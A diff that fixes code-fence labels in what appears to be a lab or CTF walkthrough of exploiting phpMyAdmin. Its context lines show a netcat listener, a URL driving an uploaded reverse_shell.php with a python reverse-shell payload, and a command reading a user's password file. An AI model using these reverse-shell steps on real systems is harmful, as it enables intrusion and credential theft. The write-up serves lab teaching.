@@ -6,7 +6,7 @@ There's yet another way to exploit the *phpMyAdmin* database. Let's dive into it
 
 To establish a *Reverse Shell*, we first need a listener on our machine. For this, we can use `netcat` to handle the task.
 
-```Sh
+```sh
 nc -lvp 4242
 ```
 
@@ -43,7 +43,7 @@ https://192.168.144.3/forum/templates_c/reverse_shell.php?cmd=python%20-c%20%27i
 
 Finally, by navigating to this page, we establish a connection to the target machine's shell session via *netcat*, allowing us to retrieve the password for the *lmezard* user.
 
-```Sh
+```sh
 cat /home/LOOKATME/password
 ```
 
